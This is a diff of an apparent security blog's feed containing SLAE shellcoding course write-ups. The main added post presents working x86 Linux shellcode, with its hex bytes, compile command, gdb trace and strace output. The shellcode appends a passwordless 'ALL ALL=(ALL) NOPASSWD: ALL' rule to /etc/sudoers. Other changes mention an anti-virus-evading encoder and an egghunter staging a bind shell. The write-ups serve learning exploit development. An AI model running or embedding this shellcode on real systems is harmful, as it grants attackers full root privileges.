class="se">\x</span>53<span class="se">\x</span>53<span class="se">\x</span>68<span class="se">\x</span>29<span class="se">\x</span>20<span class="se">\x</span>4e<span class="se">\x</span>4f<span class="se">\x</span>68<span class="se">\x</span>28<span class="se">\x</span>41<span class="se">\x</span>4c<span class="se">\x</span>4c<span class="se">\x</span>68<span class="se">\x</span>41<span class="se">\x</span>4c<span class="se">\x</span>4c<span class="se">\x</span>3d<span class="se">\x</span>68<span class="se">\x</span>41<span class="se">\x</span>4c<span class="se">\x</span>4c<span class="se">\x</span>20<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>80<span class="se">\x</span>ca<span class="se">\x</span>1c<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>f3<span class="se">\x</span>0f<span class="se">\x</span>10<span class="se">\x</span>04<span class="se">\x</span>24<span class="se">\x</span>f3<span class="se">\x</span>0f<span class="se">\x</span>58<span class="se">\x</span>04<span class="se">\x</span>24<span class="se">\x</span>66<span class="se">\x</span>0f<span class="se">\x</span>7e<span class="se">\x</span>c0<span class="se">\x</span>cd<span class="se">\x</span>80
+</span><span class='line'>cc -DSHELLCODE<span class="o">=</span><span class="sb">`</span>asm-opcodes 62<span class="sb">`</span> -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> i r mm0
+</span><span class='line'>mm0            <span class="o">{</span><span class="nv">uint64</span> <span class="o">=</span> 0x7372656f, <span class="nv">v2_int32</span> <span class="o">=</span> <span class="o">{</span>0x7372656f, 0x0<span class="o">}</span>, <span class="nv">v4_int16</span> <span class="o">=</span> <span class="o">{</span>0x656f, 0x7372, 0x0, 0x0<span class="o">}</span>, <span class="nv">v8_int8</span> <span class="o">=</span> <span class="o">{</span>0x6f, 0x65, 0x72, 0x73, 0x0, 0x0, 0x0, 0x0<span class="o">}}</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/s <span class="nv">$ebp</span>-0xc
+</span><span class='line'>0xbffff640:     <span class="s2">&quot;oers&quot;</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> <span class="k">continue</span>
+</span><span class='line'>Continuing.
+</span><span class='line'>Dump of assembler code <span class="k">for</span> <span class="k">function</span> shellcode:
+</span><span class='line'>   0x00402040 &lt;+0&gt;:     push   esp
+</span><span class='line'>   0x00402041 &lt;+1&gt;:     pop    ebp
+</span><span class='line'>   0x00402042 &lt;+2&gt;:     xor    eax,eax
+</span><span class='line'>   0x00402044 &lt;+4&gt;:     cdq
+</span><span class='line'>   0x00402045 &lt;+5&gt;:     push   0xcafebabe
+</span><span class='line'>   0x0040204a &lt;+10&gt;:    push   edx
+</span><span class='line'>   0x0040204b &lt;+11&gt;:    push   0xb98cdfd1
+</span><span class='line'>   0x00402050 &lt;+16&gt;:    push   0x17071640
+</span><span class='line'>   0x00402055 &lt;+21&gt;:    movd   mm0,DWORD PTR <span class="o">[</span>ebp-0x4<span class="o">]</span>
+</span><span class='line'>   0x00402059 &lt;+25&gt;:    pxor   mm0,QWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>
+</span><span class='line'>   0x0040205d &lt;+29&gt;:    movd   DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,mm0
+</span><span class='line'>   0x00402061 &lt;+33&gt;:    pxor   mm0,QWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>
+</span><span class='line'>   0x00402065 &lt;+37&gt;:    movd   DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>,mm0
+</span><span class='line'>   0x00402069 &lt;+41&gt;:    emms
+</span><span class='line'>   0x0040206b &lt;+43&gt;:    push   0x6374652e
+</span><span class='line'>   0x00402070 &lt;+48&gt;:    mov    ebx,esp
+</span><span class='line'>   0x00402072 &lt;+50&gt;:    inc    BYTE PTR <span class="o">[</span>ebx<span class="o">]</span>
+</span><span class='line'><span class="o">=</span>&gt; 0x00402074 &lt;+52&gt;:    push   0x20
+</span><span class='line'>   0x00402076 &lt;+54&gt;:    fild   DWORD PTR <span class="o">[</span>esp<span class="o">]</span>
+</span><span class='line'>   0x00402079 &lt;+57&gt;:    fmul   st,st<span class="o">(</span>0<span class="o">)</span>
+</span><span class='line'>   0x0040207b &lt;+59&gt;:    fist   DWORD PTR <span class="o">[</span>esp<span class="o">]</span>
+</span><span class='line'>   0x0040207e &lt;+62&gt;:    pop    ecx
+</span><span class='line'>   0x0040207f &lt;+63&gt;:    inc    ecx
+</span><span class='line'>   0x00402080 &lt;+64&gt;:    or     al,0x5
+</span><span class='line'>   0x00402082 &lt;+66&gt;:    int    0x80
+</span><span class='line'>   0x00402084 &lt;+68&gt;:    xchg   ebx,eax
+</span><span class='line'>   0x00402085 &lt;+69&gt;:    push   edx
+</span><span class='line'>   0x00402086 &lt;+70&gt;:    push   0xa4c4c41
+</span><span class='line'>   0x0040208b &lt;+75&gt;:    push   0x203a4457
+</span><span class='line'>   0x00402090 &lt;+80&gt;:    push   0x53534150
+</span><span class='line'>   0x00402095 &lt;+85&gt;:    push   0x4f4e2029
+</span><span class='line'>   0x0040209a &lt;+90&gt;:    push   0x4c4c4128
+</span><span class='line'>   0x0040209f &lt;+95&gt;:    push   0x3d4c4c41
+</span><span class='line'>   0x004020a4 &lt;+100&gt;:   push   0x204c4c41
+</span><span class='line'>   0x004020a9 &lt;+105&gt;:   mov    ecx,esp
+</span><span class='line'>   0x004020ab &lt;+107&gt;:   or     dl,0x1c
+</span><span class='line'>   0x004020ae &lt;+110&gt;:   push   0x2
+</span><span class='line'>   0x004020b0 &lt;+112&gt;:   movss  xmm0,DWORD PTR <span class="o">[</span>esp<span class="o">]</span>
+</span><span class='line'>   0x004020b5 &lt;+117&gt;:   addss  xmm0,DWORD PTR <span class="o">[</span>esp<span class="o">]</span>
+</span><span class='line'>---Type &lt;<span class="k">return</span>&gt; to <span class="k">continue</span>, or q &lt;<span class="k">return</span>&gt; to quit---
+</span><span class='line'>   0x004020ba &lt;+122&gt;:   movd   eax,xmm0
+</span><span class='line'>   0x004020be &lt;+126&gt;:   int    0x80
+</span><span class='line'>   0x004020c0 &lt;+128&gt;:   add    BYTE PTR <span class="o">[</span>eax<span class="o">]</span>,al
+</span><span class='line'>End of assembler dump.
+</span><span class='line'><span class="nv">$22</span> <span class="o">=</span> <span class="o">[</span> IF <span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>Breakpoint 2, 0x00402074 in shellcode <span class="o">()</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/s <span class="nv">$ebx</span>
+</span><span class='line'>0xbffff638:     <span class="s2">&quot;/etc/sudoers&quot;</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> c
+</span><span class='line'>Continuing.
+</span><span class='line'>Dump of assembler code <span class="k">for</span> <span class="k">function</span> shellcode:
+</span><span class='line'>   0x00402040 &lt;+0&gt;:     push   esp
+</span><span class='line'>   0x00402041 &lt;+1&gt;:     pop    ebp
+</span><span class='line'>   0x00402042 &lt;+2&gt;:     xor    eax,eax
+</span><span class='line'>   0x00402044 &lt;+4&gt;:     cdq
+</span><span class='line'>   0x00402045 &lt;+5&gt;:     push   0xcafebabe
+</span><span class='line'>   0x0040204a &lt;+10&gt;:    push   edx
+</span><span class='line'>   0x0040204b &lt;+11&gt;:    push   0xb98cdfd1
+</span><span class='line'>   0x00402050 &lt;+16&gt;:    push   0x17071640
+</span><span class='line'>   0x00402055 &lt;+21&gt;:    movd   mm0,DWORD PTR <span class="o">[</span>ebp-0x4<span class="o">]</span>
+</span><span class='line'>   0x00402059 &lt;+25&gt;:    pxor   mm0,QWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>
+</span><span class='line'>   0x0040205d &lt;+29&gt;:    movd   DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,mm0
+</span><span class='line'>   0x00402061 &lt;+33&gt;:    pxor   mm0,QWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>
+</span><span class='line'>   0x00402065 &lt;+37&gt;:    movd   DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>,mm0
+</span><span class='line'>   0x00402069 &lt;+41&gt;:    emms
+</span><span class='line'>   0x0040206b &lt;+43&gt;:    push   0x6374652e
+</span><span class='line'>   0x00402070 &lt;+48&gt;:    mov    ebx,esp
+</span><span class='line'>   0x00402072 &lt;+50&gt;:    inc    BYTE PTR <span class="o">[</span>ebx<span class="o">]</span>
+</span><span class='line'>   0x00402074 &lt;+52&gt;:    push   0x20
+</span><span class='line'>   0x00402076 &lt;+54&gt;:    fild   DWORD PTR <span class="o">[</span>esp<span class="o">]</span>
+</span><span class='line'>   0x00402079 &lt;+57&gt;:    fmul   st,st<span class="o">(</span>0<span class="o">)</span>
+</span><span class='line'>   0x0040207b &lt;+59&gt;:    fist   DWORD PTR <span class="o">[</span>esp<span class="o">]</span>
+</span><span class='line'>   0x0040207e &lt;+62&gt;:    pop    ecx
+</span><span class='line'>   0x0040207f &lt;+63&gt;:    inc    <span class="nv">ecx</span>
+</span><span class='line'><span class="o">=</span>&gt; 0x00402080 &lt;+64&gt;:    or     al,0x5
+</span><span class='line'>   0x00402082 &lt;+66&gt;:    int    0x80
+</span><span class='line'>   0x00402084 &lt;+68&gt;:    xchg   ebx,eax
+</span><span class='line'>   0x00402085 &lt;+69&gt;:    push   edx
+</span><span class='line'>   0x00402086 &lt;+70&gt;:    push   0xa4c4c41
+</span><span class='line'>   0x0040208b &lt;+75&gt;:    push   0x203a4457
+</span><span class='line'>   0x00402090 &lt;+80&gt;:    push   0x53534150
+</span><span class='line'>   0x00402095 &lt;+85&gt;:    push   0x4f4e2029
+</span><span class='line'>   0x0040209a &lt;+90&gt;:    push   0x4c4c4128
+</span><span class='line'>   0x0040209f &lt;+95&gt;:    push   0x3d4c4c41
+</span><span class='line'>   0x004020a4 &lt;+100&gt;:   push   0x204c4c41
+</span><span class='line'>   0x004020a9 &lt;+105&gt;:   mov    ecx,esp
+</span><span class='line'>   0x004020ab &lt;+107&gt;:   or     dl,0x1c
+</span><span class='line'>   0x004020ae &lt;+110&gt;:   push   0x2
+</span><span class='line'>   0x004020b0 &lt;+112&gt;:   movss  xmm0,DWORD PTR <span class="o">[</span>esp<span class="o">]</span>
+</span><span class='line'>   0x004020b5 &lt;+117&gt;:   addss  xmm0,DWORD PTR <span class="o">[</span>esp<span class="o">]</span>
+</span><span class='line'>---Type &lt;<span class="k">return</span>&gt; to <span class="k">continue</span>, or q &lt;<span class="k">return</span>&gt; to quit---
+</span><span class='line'>   0x004020ba &lt;+122&gt;:   movd   eax,xmm0
+</span><span class='line'>   0x004020be &lt;+126&gt;:   int    0x80
+</span><span class='line'>   0x004020c0 &lt;+128&gt;:   add    BYTE PTR <span class="o">[</span>eax<span class="o">]</span>,al
+</span><span class='line'>End of assembler dump.
+</span><span class='line'><span class="nv">$33</span> <span class="o">=</span> <span class="o">[</span> IF <span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>Breakpoint 5, 0x00402080 in shellcode <span class="o">()</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> i r ecx
+</span><span class='line'>ecx            0x401    1025
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Executing the shellcode correctly appends the entry to the /etc/sudoers file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># tail -n1 /etc/sudoers; strace -e open,write ./shellcode; tail -n1 /etc/sudoers</span>
+</span><span class='line'><span class="c">#includedir /etc/sudoers.d</span>
+</span><span class='line'>open<span class="o">(</span><span class="s2">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY<span class="p">|</span>O_CLOEXEC<span class="o">)</span> <span class="o">=</span> 3
+</span><span class='line'>open<span class="o">(</span><span class="s2">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>, O_RDONLY<span class="p">|</span>O_CLOEXEC<span class="o">)</span> <span class="o">=</span> 3
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Shellcode length: 128\n&quot;</span>, 22Shellcode length: 128
+</span><span class='line'><span class="o">)</span> <span class="o">=</span> 22
+</span><span class='line'>open<span class="o">(</span><span class="s2">&quot;/etc/sudoers&quot;</span>, O_WRONLY<span class="p">|</span>O_APPEND<span class="o">)</span> <span class="o">=</span> 3
+</span><span class='line'>write<span class="o">(</span>3, <span class="s2">&quot;ALL ALL=(ALL) NOPASSWD: ALL\n&quot;</span>, 28<span class="o">)</span> <span class="o">=</span> 28
+</span><span class='line'>--- SIGSEGV <span class="o">{</span><span class="nv">si_signo</span><span class="o">=</span>SIGSEGV, <span class="nv">si_code</span><span class="o">=</span>SEGV_MAPERR, <span class="nv">si_addr</span><span class="o">=</span>0x1c<span class="o">}</span> ---
+</span><span class='line'>+++ killed by SIGSEGV +++
+</span><span class='line'>Segmentation fault
+</span><span class='line'>ALL <span class="nv">ALL</span><span class="o">=(</span>ALL<span class="o">)</span> NOPASSWD: ALL
+</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[SLAE 0x05: Metasploit Payloads]]></title>
@@ -1135,7 +2506,7 @@ Student-ID: SLAE-1154
 
 <h3>3. linux/x86/read_file</h3>
 
-<p>The final shellcode reads the configured file and writes its contents to a specific file descriptor. Since the above skeleton C program will be used, the contents are going to be written to the remote client over the network on descriptor 4:</p>
+<p>The final shellcode reads the configured file and writes its contents to a specific file descriptor. Since the above skeleton C program will be used, the contents are going to be written to the remote client over the network on descriptor 4. Since it needs to obtain the absolute address in memory of the path to open, it is using the well known JMP/CALL/POP technique to avoid having 0x00 characters in the resulting shellcode:</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -1243,75 +2614,6 @@ Student-ID: SLAE-1154
 
 <p>By making use of the listening skeleton server as before, the contents of the /proc/version file are echoed back to the remote client:</p>
 
-<figure class='code'><figcaption><span>dissecting jmp/call/pop</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>Dump of assembler code <span class="k">for</span> <span class="k">function</span> shellcode:
-</span><span class='line'>   0x00402080 &lt;+0&gt;:     jmp    0x4020b8 &lt;shellcode+56&gt;
-</span><span class='line'>   0x00402082 &lt;+2&gt;:     mov    eax,0x5
-</span><span class='line'>   0x00402087 &lt;+7&gt;:     pop    <span class="nv">ebx</span>
-</span><span class='line'><span class="o">=</span>&gt; 0x00402088 &lt;+8&gt;:     xor    ecx,ecx
-</span><span class='line'>   0x0040208a &lt;+10&gt;:    int    0x80
-</span><span class='line'>   0x0040208c &lt;+12&gt;:    mov    ebx,eax
-</span><span class='line'>   0x0040208e &lt;+14&gt;:    mov    eax,0x3
-</span><span class='line'>   0x00402093 &lt;+19&gt;:    mov    edi,esp
-</span><span class='line'>   0x00402095 &lt;+21&gt;:    mov    ecx,edi
-</span><span class='line'>   0x00402097 &lt;+23&gt;:    mov    edx,0x1000
-</span><span class='line'>   0x0040209c &lt;+28&gt;:    int    0x80
-</span><span class='line'>   0x0040209e &lt;+30&gt;:    mov    edx,eax
-</span><span class='line'>   0x004020a0 &lt;+32&gt;:    mov    eax,0x4
-</span><span class='line'>   0x004020a5 &lt;+37&gt;:    mov    ebx,0x4
-</span><span class='line'>   0x004020aa &lt;+42&gt;:    int    0x80
-</span><span class='line'>   0x004020ac &lt;+44&gt;:    mov    eax,0x1
-</span><span class='line'>   0x004020b1 &lt;+49&gt;:    mov    ebx,0x0
-</span><span class='line'>   0x004020b6 &lt;+54&gt;:    int    0x80
-</span><span class='line'>   0x004020b8 &lt;+56&gt;:    call   0x402082 &lt;shellcode+2&gt;
-</span><span class='line'>   0x004020bd &lt;+61&gt;:    das
-</span><span class='line'>   0x004020be &lt;+62&gt;:    jo     0x402132
-</span><span class='line'>   0x004020c0 &lt;+64&gt;:    outs   dx,DWORD PTR ds:<span class="o">[</span>esi<span class="o">]</span>
-</span><span class='line'>   0x004020c1 &lt;+65&gt;:    arpl   WORD PTR <span class="o">[</span>edi<span class="o">]</span>,bp
-</span><span class='line'>   0x004020c3 &lt;+67&gt;:    jbe    0x40212a
-</span><span class='line'>   0x004020c5 &lt;+69&gt;:    jb     0x40213a
-</span><span class='line'>   0x004020c7 &lt;+71&gt;:    imul   ebp,DWORD PTR <span class="o">[</span>edi+0x6e<span class="o">]</span>,0x0
-</span><span class='line'>End of assembler dump.
-</span><span class='line'><span class="nv">$5</span> <span class="o">=</span> <span class="o">[</span> SF IF <span class="o">]</span>
-</span><span class='line'>0x00402088 in shellcode <span class="o">()</span>
-</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/s <span class="nv">$ebx</span>
-</span><span class='line'>0x4020bd &lt;shellcode+61&gt;:        <span class="s2">&quot;/proc/version&quot;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -1339,7 +2641,7 @@ http://securitytube-training.com/online-courses/securitytube-linux-assembly-expe
 Student-ID: SLAE-1154
 </code></pre>
 
-<p>This one details the use of an encoding scheme to encode the shellcode with and decode it subsequently on runtime.</p>
+<p>This one details the use of an encoding scheme to encode the shellcode with and decode it subsequently on runtime, which is rather handy to evade anti-virus engines.</p>
 
 <p>I&rsquo;ve decided to use <a href="http://www.yenc.org/yenc-draft.1.3.txt">YEnc</a> (draft 1.3). YEnc is used to encode binary data to be transmitted by email or newsgroups and uses the complete 8-bit character set, thus making its output only 1-2% larger than the original.</p>
 
@@ -2159,7 +3461,7 @@ Student-ID: SLAE-1154
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>To run the shellcode, like before, the configure command should be issued first, followed by make. The second stage payload can be specified by the STAGE2 variable:</p>
+<p>To run the shellcode, like before, the configure command should be issued first, followed by make. The second stage payload can be specified by the <strong>STAGE2</strong> variable:</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -2224,7 +3526,7 @@ Student-ID: SLAE-1154
 </span><span class='line'> 804807f:       ff e7                   jmp    edi
 </span><span class='line'>Shellcode size: 33
 </span><span class='line'><span class="se">\x</span>fc<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>6a<span class="se">\x</span>28<span class="se">\x</span>58<span class="se">\x</span>43<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>3c<span class="se">\x</span>f2<span class="se">\x</span>75<span class="se">\x</span>07<span class="se">\x</span>66<span class="se">\x</span>81<span class="se">\x</span>cb<span class="se">\x</span>ff<span class="se">\x</span>0f<span class="se">\x</span>eb<span class="se">\x</span>ef<span class="se">\x</span>b8<span class="se">\x</span>bd<span class="se">\x</span>ba<span class="se">\x</span>fe<span class="se">\x</span>ca<span class="se">\x</span>40<span class="se">\x</span>89<span class="se">\x</span>df<span class="se">\x</span>af<span class="se">\x</span>75<span class="se">\x</span>e4<span class="se">\x</span>ff<span class="se">\x</span>e7
-</span><span class='line'>cc -DEGGHUNTER<span class="o">=</span><span class="sb">`</span>asm-opcodes egghunter<span class="sb">`</span> -DSHELLCODE<span class="o">=</span><span class="sb">`</span>asm-opcodes ../0x02-reverse/reverse<span class="sb">`</span> -W -Wall -fno-stack-protector -zexecstack -o shellcode skel.c
+</span><span class='line'>cc -DSHELLCODE<span class="o">=</span><span class="sb">`</span>asm-opcodes egghunter<span class="sb">`</span> -DSTAGE2<span class="o">=</span><span class="sb">`</span>asm-opcodes ../0x01-bind/bind<span class="sb">`</span> -W -Wall -fno-stack-protector -zexecstack -o shellcode skel.c
 </span></code></pre></td></tr></table></div></figure>
 
 
@@ -2245,7 +3547,7 @@ Student-ID: SLAE-1154
 </span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
 </span><span class='line'><span class="c"># ./shellcode</span>
 </span><span class='line'>Egghunter length: 33
-</span><span class='line'>Shellcode length: 74
+</span><span class='line'>Second stage length: 70
 </span></code></pre></td></tr></table></div></figure>
 
 ]]></content>
@@ -2875,7 +4177,7 @@ Student-ID: SLAE-1154
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>With this in mind the registers will contain the following before and after the system call:</p>
+<p>All of the asm- auxiliary shell scripts used throughout this series that are under the bin directory, should obviously be in the PATH environment variable. With this in mind the registers will contain the following before and after the system call:</p>
 
 <pre><code>+----------+-------+
 | register | value |
